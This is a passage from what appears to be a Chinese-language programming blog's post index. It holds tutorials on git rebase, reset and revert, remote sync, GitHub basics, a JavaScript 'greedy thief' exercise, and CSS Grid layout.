commit 拆成多個 commit","text":"也許有天會用到這個功能。 簡述假設目前的紀錄長這樣： his-branch 上有一個 AA BB CC DD EE 的 commit，修改的內容如下： 但我想把他拆開成 5 個 commit，這時候就可以利用 rebase 來處理。 首先開啟 rebase 設定我們想要重設的範圍： 1git rebase -i HEAD^ 接著進入互動模式以後，注意到我們想要更新的那一筆 commit 紀錄： 這邊我們要把 pick 改成 edit，好讓我們可以重新設定這筆紀錄，設定好存檔離開以後，會看到目前的狀態如下： 12345678停止在 a852694... AA BB CC DD EE您現在可以修補這個提交，使用 git commit --amend當您對變更感到滿意，執行 git rebase --continue 能看到 rebase 碰到 edit 時就會自動停下來，讓你重新對這筆 commit 做調整，直到你最後調整完時執行 git rebase --continue 才會完成整個 rebase 的動作。 好，為了達成我們一開始的目的，接下來的流程會是： 取消原本的 AA BB CC DD EE 紀錄 分別提交 AA、BB、CC、DD、EE 結束 rebase 1git reset HEAD^ reset 後打開 sourcetree 會看到目前的狀態長這樣： 會看到現在多了 Uncommit changes，這是因為 reset 的 mixed 模式（預設值）會把檔案丟回「工作區（Working Directory）」所導致的。這正是我們要的結果，所以不用擔心。 附註：你可能會發現怎麼原本的 AA BB CC DD EE 還在？這一點在之後結束 rebase 時就會重新調整了，不用擔心。 總之接下來只要分別提交 AA BB CC DD EE 的紀錄就行了： 12345git commit -am 'AA' // 提交 AA 的內容git commit -am 'BB' // 提交 BB 的內容git commit -am 'CC' // 提交 CC 的內容git commit -am 'DD' // 提交 DD 的內容git commit -am 'EE' // 提交 EE 的內容 附註：記得要調整內容後再提交，不要一次全部提交上去 修改完以後的狀態會長這樣： 跟我們希望的結果差不多了，這時候就能結束 rebase 了： 1git rebase --continue 大功告成啦：","link":"/2022/10/09/git-rebase-split-commit/"},{"title":"Git Rebase－把多個 commit 合成一個 commit","text":"想要乾淨的紀錄就靠它。 簡述假設目前的紀錄長這樣： 我想要把 B、C、D 這三個 commit 合成一個，那我可以用 rebase 來處理。 首先會下的指令是：git rebase -i &lt;基準點&gt; -i 是代表使用「互動模式（interactively）」的意思，而 &lt;基準點&gt; 是用來告訴 Git 我們想要「從目前 HEAD 的位置到哪一個基準點」來做 rebase 的動作。 像底下這個指令： 1git rebase -i 9f9d48d 轉換成白話文的意思是： 我想要對 HEAD (265a5ac) ~ A (9f9d48d) 這個範圍做 rebase 的動作。 設定完以後就會進入互動模式的編輯畫面（vim）： 附註：注意這邊的閱讀順序是由上到下（舊到新） 基本上 pick 就是原封不動保留下來的意思，而這邊主要會用的是 s (squash) 這個指令。他的用途是把「目前的這個 commit 跟前一個合在一起」，所以我們會這樣設定： 附註：squash 其實是指「擠、捏」的這個動作 首先把 D 跟 C 合在一起，接著再把併好的 C、D 跟 B 合在一起，最後就會變成同時有 B C D 的新 commit 紀錄。 最後存檔並設定好新的 commit message 以後就可以看到我們想要的結果囉：","link":"/2022/10/08/git-rebase-squash-commit/"},{"title":"使用 Git 遠端功能時可能會碰到的問題","text":"如題。 當本地與遠端 commit 次數不同的時候假設一開始本地跟遠端的 commit 都是 10 次，現在本地做了更新後變成 commit 11 次，也就是比遠端多出一次，這個時候如果你用 git status 會得到以下訊息： 123On branch masterYour branch is ahead of 'origin/master' by 1 commit. (use \"git push\" to publish your local commits) Git 會告訴你目前本地端的 commit 次數比遠端多幾次（這裡是 1 次） 但如果反過來，現在是「遠端比本地 commit 次數還要多」的時候，Git 不會告訴你遠端比本地的 commit 還要多的這個訊息。 在遠端進行合併的動作假設遠端有 master 跟 AAA 分支，你可以在 GitHub 發送一個 pull request 跟原作者說，「欸，我想要把 AAA 合併到 master，可以嗎？」。 作者如果同意的話，AAA 就會被合併到 master，完成這個 pull request，換句話說就是「在遠端把兩個分支給合併」的意思。 從遠端同步到本地時要特別注意的事（1）如果遠端的 commit 比本地端超前進度，那從本地要 push 到遠端時，Git 會告訴你： 1234hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., 'git pull ...') before pushing again. 簡單來說的意思就是：同步遠端失敗，因為遠端的 repository 進度超前（被別人更新過內容），所以你得先用 pull 把目前最新的版本抓下來，再重新 push 上去。 從遠端同步到本地時要特別注意的事（2）如果你在遠端建立新的 repository 並且送了幾個 commit，當你要 pull 到本地端的時候會噴一段錯誤： （或者是你本地端的 .git 檔案被刪掉了也有可能發生） 1fatal: refusing to merge unrelated histories 意思是說遠端跟本地端的歷史紀錄（commit）不相干，所以不讓你 merge。 解決的辦法是加上 –allow-unrelated-histories： 1git pull origin master –allow-unrelated-histories 在分支 A 上 pull 分支 B 會怎樣？如果你在 A 分支用 git pull origin B，這個意思是「我要讓 A 跟 B 的檔案同步」，但你也知道這兩個是不同的分支，那怎麼辦？ 那就讓他變成一個分支就好了啊！ 沒錯，Git 也是這樣想的，所以 Git 會先幫你把 B 合併到 A 這個分支，接著在把檔案給同步。 不過要提醒你，在不同的分支用 git pull 這個指令是有點不合邏輯的（你怎麼會想把兩個不同的分支做「同步」的動作？），所以如果你硬要這樣做的話，Git 還是會幫你做，但它會跳一些訊息提醒你： （Git 會要你解釋一下，why 你要這樣做？）","link":"/2021/12/13/git-remote-problem/"},{"title":"Git－reset 與 revert 的差別","text":"好久不見來個 Git。 簡述這邊我們直接拿範例來解釋，假設這是一開始的紀錄： 執行 git reset HEAD^ 以後的結果如下： 執行 git revert HEAD 以後的結果如下（注意沒有 ^）： 簡單來說兩個都是回到上一個 commit 的紀錄點，但差別在於 reset 是直接把該筆紀錄清除，而 revert 則是額外產生一個新的 commit 紀錄。 當時我對 revert 的方式有點疑問，因為明明直接清掉不是更乾脆嗎？何必多產生一筆新的 commit？但這邊可以先思考一件事情： 如果這些紀錄是有推到遠端上的話，你在本地做 reset 的話要怎麼同步到遠端上？ 有操作過遠端倉庫的人一定都知道，如果在本地做 reset 的話是沒辦法把這些資訊 push 上去的，因為 Git 會跟你說本地端落後遠端的進度。唯一的方法只有用 git push -f 來強制更新（但一般不太可能這樣做），否則的話是沒辦法同步到遠端上的。 可是如果是 revert 的做法就不會有這個問題，因為你是把內容重置後在建立一筆新的 commit 紀錄，既然這是新的 commit 紀錄，就不會有剛剛本地端落後遠端的問題，所以這時候就可以順利的把遠端也做 reset 的更新。","link":"/2022/10/03/git-reset-and-revert-difference/"},{"title":"Git 中的狀況劇","text":"各種用 Git 時可能會發生的情境。 commit 訊息打錯字git commit --amend（僅限上一次的 commit） commit 又後悔了git reset HEAD^ --hard，我剛剛發的 commit 跟做的東西我全都不要了。git reset HEAD^ --soft，我只是收回 commit，但我內容還要留著。git reset HEAD^ --mixed，跟 –soft 的效果一樣，差別只在於 –mixed 會退回到 Untracked 的狀態。 你可以把 HEAD 想成是我們在「資料夾模擬法」中提到的那個，「用來記錄最新的版本是哪一個」的檔案，所以 HEAD^ 的意思就是「最新版本的前一個」的意思。 如果要指定前很多個的版本，也可以用 「HEAD^數字」的方式來表示。 還沒 commit，但我剛剛改的東西不要了git restore file-name 指定某個檔案git restore . 所有檔案 我想要改分支的名字git branch -m new-branch-name 記得要切換到你想要改名字的那個分支。 把遠端的 branch 摘下來git checkout branch-name 在你 clone 某些 Repository 到本地端的時候，你可能會發現有些遠端的分支在自己的電腦上不會顯示出來。 這個時候你只要用這個切換分支的指令，Git 就會自動把遠端的 branch 摘下來了。 參考資料Git reset 的三種模式( soft mixed hard )比較git reset - 還原版本","link":"/2021/12/13/git-situation/"},{"title":"Git－同步遠端的方式","text":"又來填坑啦。 指令先把遠端最新的進度抓下來（是進度不是檔案） 1git fetch 切換到想要同步的分支 1git checkout &lt;branch-name&gt; 合併 1git merge origin/&lt;branch-name&gt; 這樣子那個分支的檔案就會跟遠端是同步的狀態了。 Source tree 先 fetch 遠端的進度 看到更新的進度後，把他 merge 到你想要的分支上 這樣就搞定了。 關於 fetch 與 pull（原理）簡單來說，我們要讓進度同步主要需要兩個條件： 取得進度 把最新進度跟原始進度做合併 所以我們平常在用 pull origin master 的意思其實是： 1. 先把最新進度抓下來（是進度不是檔案） 1git fetch &lt;remote&gt;（如果你有很多個才需要特別指定） 2. 合併到我目前的分支（注意是用斜線分隔） 1git merge origin/master 所以合起來才會是： 1git pull origin master 這個就是 fetch 跟 pull 的差別，希望能幫助自己釐清關於分支的疑惑。 參考資料 【狀況題】怎麼跟上當初 fork 專案的進度？ Pull 下載更新","link":"/2022/06/07/git-sync-remote/"},{"title":"GitHub 的一些基本功能","text":"一些我久沒用的話大概會忘記的基本功能。 commit可以用來看每一次的 commit 紀錄，還有每個 commit 改了哪些東西，每個 commit 時的檔案內容。 blame查看檔案的內容是誰編輯的（抓兇手），每一行都會顯示最後編輯的人是誰。 issue可以在這裡提出對這個專案有問題的地方，解決了話可以 close。 contributor有誰跟你一起協作。 explore可以看到其他人的 repository。","link":"/2021/12/13/github-basic-usage/"},{"title":"GitHub 的一些小知識","text":"這篇會講一下 GitHub 是什麼，還有 GitHub 的建議工作流程，還有 GitHub Pages 的使用。 關於 GitHub共用一個 Git 的專案 = repository，那要怎麼共享 repository？ 把專案上傳到某個地方（GitHub），讓別人可以下載下來。 GitHub 其實就是一個可以放 .git 資料夾的「地方」 你可以只用 Git，不用 GitHub；但不可以只用 GitHub，不用 Git。 GitHub work-flow簡單來說就是工作流程，只要你想要新增什麼功能或修復，就可以參考這個步驟： 建立新分支 在新分支上 commit 發出 pull request 大家 code review 做討論（review 後可以做 approve 的動作） 部屬（deploy） 合併（merge） 刪除分支 GitHub Pages就是可以在上面放「靜態檔案」的頁面。 GitHub Pages 頁面的預設「根路徑」是 https://github.com/jubeatt/repository-name，它會去找你 repository 中的 index.html 檔案，如果找不到的話就會顯示 404。 如果你要在頁面中察看某個檔案的內容，只要在根路徑填上對應的「相對路徑」就行了： 1234假設這是專案的資料夾結構-- repository-name -- aaa.txt -- bbb.rxt 我如果想看 aaa.txt 的頁面：https://github.com/jubeatt/repository-name/aaa.txt 我如果想看 aaa.txt 的頁面：https://github.com/jubeatt/repository-name/bbb.txt GitLab 與 Bitbucket其實就是不同的平台，比較大的差異可能在 UI，但使用方式跟 GitHub 大致上很雷同。","link":"/2021/12/13/github-knowledge/"},{"title":"貪婪的小偷","text":"這是來自 LIOJ 上的題目，因為陷阱還蠻特別的，所以想記錄下來。 魔鬼藏在細節裡我想很多人應該都很困惑明明在自己電腦跑都 OK，但系統還是一直噴 Wrong Answer (´⊙ω⊙`) 我其實也搞了老半天才發現，但在討論陷阱之前，先談談這題的解法。 這題的解法其實不難，就是「根據小偷可以偷的數量，把每樣物品價格由大到小做加總」，所以我是這樣做的： 把物品陣列做排序，由大排到小 把陣列加總，從第一個加到第 n 個（n = 小偷能偷的總數量） 12345678910111213141516171819202122232425function solve(lines) { // 小偷能偷到的總金額 let totalValue = 0 // 小偷能帶走物品的最大數量 const max = Number(lines[0]) // 所有物品（除掉前兩筆元素） const items = transformToNumber(lines.slice(2)) // 重新排序，由大排到小 items.sort((a, b) =&gt; b - a) // 把陣列加總 for(let i=0; i&lt;max; i++) { totalValue += items[i] } console.log(totalValue)}// 轉換成 Number 型態function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result }solve(['3', '5', '1', '3', '5', '7', '9']) // 21 這樣子看起來沒有什麼問題，範例給的測試資料也能得到正確結果。 凡事都要設想周到但是！有一件很重要的事情被忽略了：如果小偷能偷的數量 &gt;= 所有物品的數量呢？ 沒有錯，我想這一題 AC 率會那麼低就是因為很多人跟我一樣都忽略掉了這件事，所以才會懷疑人生老半天。 先讓我們看看如果在「能偷的數量 &gt;= 物品的數量」的情況會發生什麼： 1solve(['100', '5', '1', '3', '5', '7', '9']) 答案是 NaN，問題出在這一段： 1234// 把陣列加總for(let i=0; i&lt;max; i++) { totalValue += items[i]} 陣列的物品只有 [1, 3, 5, 7, 9] 這五個，而 max 是 100，也就是說這個迴圈會從 0 跑到 99。 所以請想想看，在 item[5] 的時候會發生什麼？ 12// 迴圈跑到第六圈（i = 5）totalValue += undefined 現在你知道為什麼會冒出 NaN 了吧。 正確的作法經過剛剛的教訓後，我們可以修正成這樣： 123456789101112131415161718192021222324252627282930313233343536373839function solve(lines) { // 小偷能偷到的總金額 let totalValue = 0 // 小偷能帶走物品的最大數量 const max = Number(lines[0]) // 物品的總數量 const totalItem = Number(lines[1]) // 所有物品（除掉前兩筆元素） const items = transformToNumber(lines.slice(2)) /* Edge case： 小偷可以偷的數量 &gt;= 所有物品的數量 這時後的答案就變成是陣列總和 */ if(max &gt;= totalItem) { for(let i=0; i&lt;items.length; i++) { totalValue += items[i] } console.log(totalValue) } else { // 重新排序，由大排到小 items.sort((a, b) =&gt; b - a) // 切割出可偷的物品陣列 for(let i=0; i&lt;max; i++) { totalValue += items[i] } console.log(totalValue) }}// 轉換成 Number 型態function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result }solve(['100', '5', '1', '3', '5', '7', '9']) // 25 利用 slice() 寫出更簡潔的作法除了用 for 迴圈來求陣列總和以外，你也可以換個思維： 把物品陣列做排序，由大排到小 切割出物品陣列的範圍，從 0 切到 n 的範圍（n = 小偷能偷的總數量） 把切割出的陣列加總 所以最後會寫出這樣子的程式碼： 1234567891011121314151617181920212223242526function solve(lines) { // 小偷能偷到的總金額 let totalValue = 0 // 小偷能帶走物品的最大數量 const max = Number(lines[0]) // 物品的數量 const totalItem = Number(lines[1]) // 所有物品（除掉前兩筆元素） const items = transformToNumber(lines.slice(2)) // 重新排序，由大排到小 items.sort((a, b) =&gt; b - a) // 切割出可偷的物品陣列 const availableItems = items.slice(0, max) // 計算陣列總和 totalValue = availableItems.reduce((acc, elem) =&gt; acc + elem, 0) console.log(totalValue)}// 轉換成 Number 型態function transformToNumber(arr) { let result = [] for(let i=0; i&lt;arr.length; i++) { result.push(Number(arr[i])) } return result } 之所以可以省略掉判斷的原因是因為這一句： 1const availableItems = items.slice(0, max) 如果把 slice() 的第二個參數設成比陣列長度大的數字，會自動視為是最後一個元素的意思。因此 max 不管是多大的數字，availableItems 都會是一個完整的陣列。","link":"/2021/12/22/greedy-thief/"},{"title":"一步一步認識Grid","text":"目前在網頁佈局的方式有很多種選擇，其中最主流的不外乎就是flex-box。 雖然 flex 確實足以處理許多版面，使用上也不算困難，但為了更增進自己的能力，讓自己在面對各種版型都能有應對之道，所以我決定學習另外一個也算是頗新穎的佈局方式，grid-box。 不過當我在找相關資料時，發現 grid 的相關中文教學似乎比較少一些（比起 flex），所以就決定自己來寫一篇文章，希望能夠為有需要的人提供一份資源。 另外，由於 grid-box 的概念可能比 flex-box 還要來得複雜一些（至少對我來說是這樣子），所以這篇文章的內容也會比較沉長些，可能會需要花點時間來閱讀，還請各位見諒一下。 最後希望大家都能夠透過這篇文章來真正理解 grid 的佈局方式，我相信多學一樣技能，對自己只有好，沒有壞。 關於 grid在學習 grid 的語法前，我認為大家可以先了解一下 grid 的基本結構是長什麼樣子，接著才去學 grid 的相關屬性，這樣子的學習順序對你應該會比較有幫助。 認識欄與列讓我們從建立一個最基本的 grid 網格開始： 1&lt;div class=\"box\"&gt;&lt;/div&gt; 12345.box { display: grid; grid-template-columns: 100px 100px 100px 100px; grid-template-rows: 100px 100px;} 先不用在意那些數字是什麼意思，總之你能看到，我們建立了一個四欄兩列的格子。 欄 = 每一個直排，英文為 “column” 。列 = 每一個橫排，英文為 “row” 。 接著我們來看剛剛設定的每一個屬性吧： 1display: grid; 代表我們在.box這個區塊中建立一個 grid 網格，就跟在使用 flex 時的display:flex是一樣的概念。 1grid-template-columns: 100px 100px 100px 100px; 這是用來設定 「欄(column)」 的部分，代表每個欄的寬度為 100px，而我們設定了 4 次，所以總共就會產生 4 個欄。 1grid-template-rows: 100px 100px; 這是用來設定 「列(row)」 的部分，代表每個列的寬度為100px，而我們設定了 2 次，所以總共就產生 2 個列。 所以，一個最基本的 grid 網格，就是由 「欄與列」 來組成的。 認識格線在你認識欄與列後，讓我們回頭來談談那些數字，又是怎麼一回事吧？ 一個 grid 網格 中，除了欄與列之外，還有一個東西叫做 「格線」。 格線是一個用來分割每個列跟欄的線，而每個格線都會有一個編號，這個編號會從 1 開始算起。 我知道你可能接著會想問，那麼負數又代表什麼？ 其實格線除了用正數來表示以外，也可以用負數來表示，用中文來說的話就是 「倒數第幾個」 的意思。 那格線能夠做什麼？一樣讓我們用例子來舉例吧： 現在我們在剛剛建立好的 grid 網格中新增 grid元素 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--greem\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 💡 註：這裡只有對方塊設定背景顏色（grid 元素在沒有設定寬高時，預設會填滿整個欄與列的空間） 所以你能看到，在我們還沒有對 grid 網格中的元素做任何設定時，元素會依照 「左 → 右」，「上 → 下」 這樣的順序來塞到每一個網格中。 那如果我們想要控制元素的位置呢？ 沒有錯，這個時候格線就派上用場了。 這裡先介紹一個屬性：grid-column-start，可以用來指定 grid 元素的起始位置。 現在讓我們來更改紫色方塊的位置： 123.item--purple { grid-column-start: 2;} 💡 註：在沒有指定grid-column-end (終點位置) 時，grid 元素預設會跨到下一條格線 (2 → 3)。 這樣子我們就把紫色方塊放到以格線(2)為起始點的位置。 還記得我們說過格線也可以用負數來表示嗎？ 讓我們在修改一下紫色方塊的位置： 123.item--purple { grid-column-start: -2;} 現在紫色方塊被放到以格線(-2)為起始點的位置。 我想這樣子你對於格線應該就有一些概念了。 不過，除了設定元素的起始位置以外，我們也可以設定元素的終點位置。 再讓我們介紹第二個屬性：grid-columns-end 我們一樣來控制紫色方塊的位置： 1234.item--purple { grid-column-start: 2; grid-column-end: 4;} 這裡要特別提醒一下，雖然紫色方塊看起來是佔據第 2 到 第 3 欄的範圍，但由於我們是以格線來做控制，所以正確的位置應該是 2 → 4，而不是 2 → 3 哦！ 另外，剛剛都是以 欄(column) 來做介紹，不過除了 欄(column) 以外，我們也能夠控制 列(row) 的部分。兩者的概念其實都是一樣的，只是從 欄(column) 變成 列(row) 而已，這裡我把相關的屬性，以及縮寫形式，條列給各位參考： 1234567891011// 控制欄grid-column-start: 1;grid-column-end: 3;// 縮寫形式grid-column: 1 / 3;// 控制列grid-row-start: 2;grid-row-end: 4;// 縮寫形式grid-row: 2 / 4; 最後附上 Codepen 給大家練習 ： See the Pen grid-column-start / end &amp; grid-row-start / end by jim (@jubeatt) on CodePen. 💡 如果看不懂 SCSS 的語法沒有關係，裡面有提供註解來協助各位。 認識顯性格線與隱性格線在你開始學習 grid 相關的屬性前，最後還有一件事情得知道。 其實格線本身還可以在區分為以下兩種： 顯性格線 (explicit tracks) 隱性格線 (implicit tracks) 💡 註：tracks 這個單字的正統翻譯翻作「軌道 / 軌跡」，不過我個人還是喜歡用格線來稱呼。 使用grid-template-rows, grid-template-columns來產生出的格線，都叫做 顯性格線 (explicit tracks)。 那隱性格線呢？讓我們來看個例子吧： 1234&lt;div class=\"box\"&gt; &lt;div class=\"item item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item item--blue\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { display: grid; // 建立兩個欄（顯性格線） grid-template-columns: 100px 100px; // 每欄 \"之間\" 的間隔 column-gap: 20px;}.item { // 由於網格中沒有設定列， // grid元素無法填滿列的空間， // 所以這裡先指定一個高度 height: 100px;} 嗯…看起來沒有什麼特別的。 這裡透過 Firefox 的開發者工具來查看，我們能發現一些不一樣的東西： 💡 仔細觀察線，你會看到有一些差異（建議要放大一點看比較清楚） 你會看到有三種格線，分別為： 虛線：代表顯性格線 點線：代表隱性格線 實線：代表顯性格線的起點 / 終點 實線的部分 我們在一開始透過grid-template-columns: 100px 100px;建立了兩個欄，所以左右兩端的實線代表顯性格線的起點與終點。 你可能會好奇，頂端那條顯性格線的起點（列）是怎麼回事，畢竟我們並沒有對列做設定不是嗎？這個嘛，我是這樣理解的，有一句話叫做有始有終，所以我想在 grid 中也是這個道理，既使我們沒有對列做設定，它也應該要有一個起始點。 虛線的部分 我們設定每一欄的寬度為100px，所以每100px就會有一條虛線來代表一欄的寬度。 點線的部分 我們並沒有使用grid-template-rows來設定列，所以這時候瀏覽器就自動幫我們產生了一條新的格線，這種格線就稱為 隱性格線(implicit tracks)。 要注意的一點是，在沒有做任何設定時，隱性格線的寬度是由 grid 元素來撐開，也就是說，如果 grid 元素的高度（或寬度）為0px，隱性格線的寬度就會是0px。 參考下面這張圖： 🚀 Codepen：點這裡 要對隱性格線做設定，必須用grid-auto-rows, grid-auto-columns這兩個屬性。 我們對上面的範例做個調整： 1234.box { // 對隱性格線做設定 grid-template-rows: 130px;} 🚀 Codepen：點這裡 💡 雖然我們現在設定了列的格線，不過由於我們設定的是隱性格線，所以你可以看到圖中的列（尾端）還是以點線來顯示。 為什麼需要隱性格線？相信看到這裡後，你應該已經知道要怎麼分辨顯性格線與隱性格線。不過你可能還有一個疑問，為什麼需要隱性格線呢？它又是用來做什麼的？ 要了解這件事情，得先弄清楚一件事，什麼時候會產生隱性格線？ → 隱性格線只有在 grid 元素超出顯性格線所定義的範圍時，才會產生。 以前面的例子來說，我們用 grid-template-columns來設定兩欄，但沒有設定列，就丟了兩個元素到 grid 網格中，這很顯然會超出顯性格線的範圍。 而這個時候如果沒有自動產生隱性格線的話，我們的 grid 網格可能會長的像這樣： 所以如果沒有隱性格線的話 → grid 網格會因為缺乏足夠的欄與列，而無法容納超出範圍的元素。為了避免這問題，我們才需要隱性格線 → 使 grid 網格產生出足夠的欄與列，來容納超出範圍的元素。 最後，做一個小總結： 格線可以分成隱性格線 / 顯性格線。 顯性格線是用 grid-templates-columns / rows 做的設定。 隱性格線是用 grid-auto-columns / rows 做的設定。 隱性格線只有在 grid 元素 超出顯性格線的範圍（或是沒有設定顯性格線）時，才會產生。 隱性格線的預設寬度是由 grid 元素來撐開。 以及一些額外補充： 超出顯性格線 grid 範圍的元素，會根據 grid-auto-flow 的設定，來決定要放到下一列 or 下一欄。 grid-auto-columns / rows可以像grid-templates-columns / rows一樣設定多個值。 最後附上 Codepen 給大家練習 ： See the Pen grid-explicit &amp; implicit by jim (@jubeatt) on CodePen. 如果以上這些概念你都理解的話，接著就能開始學習 grid 的相關屬性囉！ gird 屬性列表 display grid-template-rows &amp; grid-template-columns grid-row &amp; grid-column grid-auto-flow grid-auto-rows &amp; grid-auto-columns grid-area &amp; grid-template-areas column-gap &amp; row-gap justify-items align-items place-items justify-content align-content place-content justify-self align-self place-self order grid 的特別單位與函式grid 中有一些特殊的單位或函式，能夠讓 grid 撰寫起來更方便，或是發揮更強大的功能。 span 關鍵字前面有說過，我們能透過grid-row, grid-column來設定 grid 元素的位置。 但是當格線數量比較多的時候，通常就得一個一個數，這樣很不方便。 所以 grid 也提供了span這個關鍵字，讓你可以直接指定欄 / 列數，而不用再數格線。 用法： 如果是在start上設定的話，就代表從end往前數過去。 如果是在end上設定的話，就代表從start往後數過去。 12345678910111213.item--yellow { // end = 格線(-1) // start = 從end數過來的第二欄 grid-column: span 2 / -1;}.item--blue { // start = 格線(1) // end = 從start處數過來的第二欄 grid-column: 1 / span 2; // 或是這樣寫也行 grid-column-start: span 2;} 🚀 Codepen：點這裡 fr 單位fr 為fraction(分數)的縮寫。 💡 註 1：fr 的最小值為grid元素中的內容寬度（不會縮到比內容還要小），你也能想成 1fr = (auto, 1fr), min=auto, max=1fr。 💡 註 2：不知道你有沒有背過這些單字：fracture(斷裂), fragile(易碎的), fragment(碎片)，frag 是「破壞、斷、折」的字首，所以帶有這個字首的單字意思都會差不多，fraction 也是其中之一，所以能利用這個字首來幫助記憶。 fr 跟 flex 中的flex-grow有點像，能夠利用剩餘空間來分配給元素，我們直接看例子： 123456.box { width: 960px; display: grid; grid-template-columns: 100px 1fr 1fr 2fr 2fr 3fr; grid-gap: 20px;} 🚀 Codepen：點這裡 使用 fr 的時候必須要知道： 總空間有多大 哪些東西佔據了多少的固定空間 計算出剩餘空間 fr的總分數值 每個區塊的fr值 所以上面的例子能分析出： 總空間：960px 固定空間：100px的間距(5個20px)，100px的方塊 剩餘空間：960-100-100 = 760px fr 的總分數值：1+1+2+2+3 = 9 每個區塊的 fr 值： 1/9, 1/9, 2/9, 2/9, 3/9 這些東西都有之後，你就能利用剩餘空間 x fr值來計算出每個方塊的實際大小是多少。 使用 fr 的好處 假設想讓每個區塊大小一樣，不需要做任何計算，只要全部設為 1fr 即可。 新增欄/列時，不用像使用 %一樣，得全部重新計算。 修改間距時，不用像使用 % 一樣，得全部重新計算。 修改某個欄/列的寬度時，不用像使用 % 一樣，得全部重新計算。 minmax()用途：設定欄與列的最大最小值 就跟min-width和max-width的概念是一樣的，你可以指定每個欄列的最大與最小寬度。 123456&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt;&lt;/div&gt; 123456789101112.box { // 建立五欄 // 每個欄的最大寬度 100px // 每個欄的最小寬度 50px grid-template-columns: minmax(50px, 100px) minmax(50px, 100px) minmax(50px, 100px) minmax(50px, 100px); // 建立一列 // 每個列的最大寬度 100px // 每個列的最小寬度 50px grid-template-rows: minmax(50px, 100px);} 🚀 Codepen：點這裡 💡 現在方塊最小只能縮到 50px，最大只能擴到 100px。 repeat()用途：指定次數，把要重複的值寫進去。 假設我想要建立 100px, 150px 這樣的欄 5 次，就這樣子寫： 1234.box { // 重複建立 50px 100px的欄 \"5次\" grid-template-columns: repeat(5, 100px 150px);} 🚀 Codepen：點這裡 auto-fill &amp; auto-fit兩個都得搭配repeat()一起使用。 當你不想明確指定要有幾欄幾列，也不確定 grid 元素的數量時，這兩個屬性會很有幫助。 跟隱性格線有一點類似，但隱性格線的問題是： grid 元素只會往單一方向排列（欄或列） 必須要有 grid 元素存在，才會產生網格。 每當放入新的 grid 元素，就會一直產生新的網格，無法限制在一個範圍內。 auto-fill 用途：根據設定的尺寸，盡可能在 grid 空間中建立最多的欄或列。 💡 註 1：既使沒有放入 grid 元素，該網格佔據的空間依然會存在。💡 註 2：會隨著容器寬度來動態更新網格的欄數。 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // grid空間的寬度與高度 width: 70%; max-width: 760px; height: 250px; // 建立grid網格 display: grid; // 產生100px的欄，直到塞不下grid空間為止。 grid-template-columns: repeat(auto-fill, 100px); // 產生100px的列，直到塞不下grid空間為止。 grid-template-rows: repeat(auto-fill, 100px);} 🚀 Codepen：點這裡 你可以看到： grid 空間的寬度為 760px，每欄 100px，最多可以建立 7 欄。 grid 空間的高度為 250px，每列 100px，最多可以建立 2 列。 grid 空間中只有放入 5 個 grid 元素，但空的網格依然存在。 並且能夠隨著 grid 空間的範圍動態更新網格： 🚀 Codepen：點這裡 auto-fit 用途：根據設定的尺寸，盡可能在 grid 空間中建立最多的欄或列。 💡 註 1：若是沒有放入 grid 元素，該網格佔據的空間會被折疊。💡 註 2：會隨著容器寬度來動態更新網格的欄數。 1234567&lt;div class=\"box\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;div class=\"item--green\"&gt;&lt;/div&gt; &lt;div class=\"item--pink\"&gt;&lt;/div&gt; &lt;div class=\"item--purple\"&gt;&lt;/div&gt;&lt;/div&gt; 1234567891011121314.box { // grid空間的寬度與高度 width: 70%; max-width: 760px; height: 250px; // 建立grid網格 display: grid; // 產生100px的欄，直到塞不下grid空間為止。 grid-template-columns: repeat(auto-fit, 100px); // 產生100px的列，直到塞不下grid空間為止。 grid-template-rows: repeat(auto-fit, 100px);} 🚀 Codepen：點這裡 你可以看到： grid 空間的寬度為 760px，每欄 100px，最多可以建立 7 欄 (注意格線編號)。 grid 空間的高度為 250px，每列 100px，最多可以建立 2 列 (注意格線編號)。 grid 空間中只有放入 5 個 grid 元素，但空的網格會被折疊。 並且能夠隨著 grid 空間的範圍動態更新網格： 🚀 Codepen：點這裡 ⚠ auto-fill &amp; auto-fit 使用時的小陷阱 回顧一下剛剛提到這兩者的差異： fit：空的網格空間會被折疊成 0px fill：空網格格空間會仍然維持設定的空間 這跟我們接下來要談的東西有很大的關係，所以請各位務必記得這兩個差異。 接著來看個例子： 1234567891011&lt;div class=\"wrap\"&gt; &lt;div class=\"box--fit\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"box--fill\"&gt; &lt;div class=\"item--yellow\"&gt;&lt;/div&gt; &lt;div class=\"item--blue\"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819.box--fit { // grid空間的大小為760px width: 760px; // 盡可能填滿grid空間 // 每欄的最小寬 200px // 若寬比 200px大，則套用1fr grid-template-column: repeat(auto-fit, minmax(200px, 1fr));}.box--fill { // grid空間的大小為760px width: 760px; // 盡可能填滿grid空間 // 每欄的最小寬 200px // 若寬比 200px大，則套用1fr grid-template-column: repeat(auto-fit, minmax(200px, 1fr));} 結果如下： 🚀 